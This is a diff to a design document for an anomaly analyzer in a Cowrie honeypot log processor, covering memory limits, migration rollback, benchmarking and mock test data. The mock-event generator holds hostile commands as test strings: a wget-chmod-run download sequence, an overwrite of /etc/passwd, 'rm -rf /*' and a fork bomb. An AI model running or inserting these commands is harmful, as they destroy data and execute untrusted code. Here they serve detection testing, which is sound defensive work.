@@ -1717,7 +1717,7 @@ def extract_commands_for_session(session_id: str) -> List[str]:
 
 ### **Command Extraction Architecture (Critical Design)**
 
-#### **Proper Database Integration Pattern**
+#### **Performance-Optimized Implementation**
 ```python
 class LongtailAnalyzer:
     """Analyzer needs database access for command extraction."""
@@ -1781,6 +1781,93 @@ class LongtailAnalyzer:
 - **Database Errors**: Retry logic for transient database issues
 - **Memory Limits**: Graceful degradation if dataset too large for memory
 
+#### **Resource Monitoring Implementation**
+```python
+import resource
+import psutil
+
+class LongtailAnalyzer:
+    def analyze(self, sessions: List[SessionSummary], lookback_days: int) -> LongtailAnalysisResult:
+        """Analyze with resource monitoring and performance optimization."""
+
+        # Monitor resources
+        process = psutil.Process()
+        start_memory = process.memory_info().rss / 1024 / 1024  # MB
+
+        # Set memory limit (500MB)
+        soft, hard = resource.getrlimit(resource.RLIMIT_AS)
+        resource.setrlimit(resource.RLIMIT_AS, (500 * 1024 * 1024, hard))
+
+        try:
+            result = self._perform_analysis(sessions, lookback_days)
+
+            # Record memory usage
+            end_memory = process.memory_info().rss / 1024 / 1024
+            result.memory_usage_mb = end_memory - start_memory
+
+            if result.memory_usage_mb > 400:  # Warning threshold
+                logger.warning(f"High memory usage: {result.memory_usage_mb:.1f}MB")
+
+            return result
+
+        except MemoryError:
+            logger.error("Memory limit exceeded, falling back to batch processing")
+            return self._analyze_in_batches(sessions, lookback_days)
+```
+
+#### **Migration Rollback Strategy**
+```python
+def _downgrade_from_v9(connection: Connection) -> None:
+    """Rollback v9 migration if needed."""
+    logger.info("Rolling back longtail analysis tables...")
+
+    # Drop tables in reverse order of dependencies
+    connection.execute(text("DROP TABLE IF EXISTS longtail_detections CASCADE"))
+    connection.execute(text("DROP TABLE IF EXISTS longtail_analysis CASCADE"))
+
+    # If using PostgreSQL with pgvector
+    if connection.dialect.name == 'postgresql':
+        connection.execute(text("DROP TABLE IF EXISTS longtail_analysis_vectors CASCADE"))
+        connection.execute(text("DROP TABLE IF EXISTS longtail_vector_detections CASCADE"))
+
+    # Update schema version
+    connection.execute(text("UPDATE schema_metadata SET version = 8"))
+
+    logger.info("Rollback to v8 complete")
+```
+
+#### **Dimension Benchmarking Framework**
+```python
+def benchmark_vector_dimensions(self, test_data: List[RawEvent]) -> Dict[int, float]:
+    """Benchmark different vector dimensions for optimal performance."""
+    dimensions_to_test = [32, 64, 128, 256]
+    results = {}
+
+    for dim in dimensions_to_test:
+        vectorizer = TfidfVectorizer(max_features=dim)
+
+        start_time = time.perf_counter()
+        analyzer = LongtailAnalyzer(vector_dimension=dim)
+        result = analyzer.analyze(test_data, lookback_days=30)
+        duration = time.perf_counter() - start_time
+
+        # Calculate quality metrics
+        silhouette = result.statistical_summary.get("avg_silhouette_score", 0)
+
+        results[dim] = {
+            "duration": duration,
+            "memory_mb": result.memory_usage_mb,
+            "quality_score": silhouette,
+            "efficiency": (1000 / duration) * silhouette  # Combined metric
+        }
+
+    # Recommend optimal dimension
+    optimal = max(results.items(), key=lambda x: x[1]["efficiency"])
+    logger.info(f"Optimal dimension: {optimal[0]} (efficiency: {optimal[1]['efficiency']:.2f})")
+
+    return results
+```
+
 ### **Required Fixes for LongtailAnalyzer**
 1. **Replace `session.commands` access** with proper database queries ✅ IMPLEMENTED
 2. **Add session_factory to __init__** for database access
@@ -1809,6 +1896,75 @@ class LongtailAnalyzer:
 - **Remaining Work**: Implement designed architecture, database migration, testing
 
 **Progress Assessment**: Realistic 15-20% complete. You have solid architectural decisions and fixed foundational issues, but still need to implement the actual database queries and migration.
+
+### **Test Data Generation**
+```python
+def _create_mock_events_with_sequences(self) -> List[RawEvent]:
+    """Create realistic mock events for testing."""
+    # Normal sequence pattern
+    normal_sequence = ["ls", "cd /tmp", "wget http://example.com", "chmod +x file", "./file"]
+
+    # Anomalous sequence pattern
+    anomalous_sequence = ["echo 'evil' > /etc/passwd", "rm -rf /*", ":(){ :|:& };:"]
+
+    events = []
+    session_id = "test_session_001"
+
+    # Create normal events
+    for i, cmd in enumerate(normal_sequence * 10):  # Repeat for frequency
+        events.append(RawEvent(
+            id=i,
+            session_id=session_id,
+            event_type="cowrie.command.input",
+            payload={"input": cmd},
+            event_timestamp=datetime.now(UTC) - timedelta(hours=i)
+        ))
+
+    # Add anomalous events
+    for i, cmd in enumerate(anomalous_sequence, start=100):
+        events.append(RawEvent(
+            id=i,
+            session_id=f"anomalous_{i}",
+            event_type="cowrie.command.input",
+            payload={"input": cmd},
+            event_timestamp=datetime.now(UTC)
+        ))
+
+    return events
+```
+
+### **Environment Validation (Before Implementation)**
+```bash
+# 1. Verify PostgreSQL has pgvector
+psql -U your_user -d cowrie_db -c "SELECT extversion FROM pg_extension WHERE extname = 'vector';"
+
+# 2. Check current schema version
+uv run cowrie-db info
+
+# 3. Validate test data availability
+uv run python -c "
+from cowrieprocessor.db.engine import create_engine_from_settings
+from cowrieprocessor.db.models import RawEvent
+engine = create_engine_from_settings('your_db_url')
+with engine.connect() as conn:
+    count = conn.execute('SELECT COUNT(*) FROM raw_events WHERE event_type = %s', ['cowrie.command.input']).scalar()
+    print(f'Available command events: {count}')
+"
+
+# 4. Memory baseline
+uv run python -c "
+import psutil
+print(f'Available memory: {psutil.virtual_memory().available / 1024 / 1024:.1f}MB')
+"
+```
+
+### **Priority Order for Implementation**
+1. **Command Extraction (2-3 hours)** - Cannot test anything without this
+2. **Test Data Generation (1 hour)** - Need this for development testing
+3. **Resource Monitoring (1 hour)** - Prevent OOM during development
+4. **Migration with Rollback (2 hours)** - Safe database changes
+5. **Vectorization with Vocabulary (3 hours)** - Core analysis capability
+6. **Dimension Benchmarking (2 hours)** - Optimize before production
 
 **Key Technical Corrections Applied:**
 - Single schema version track (v9) with runtime feature detection
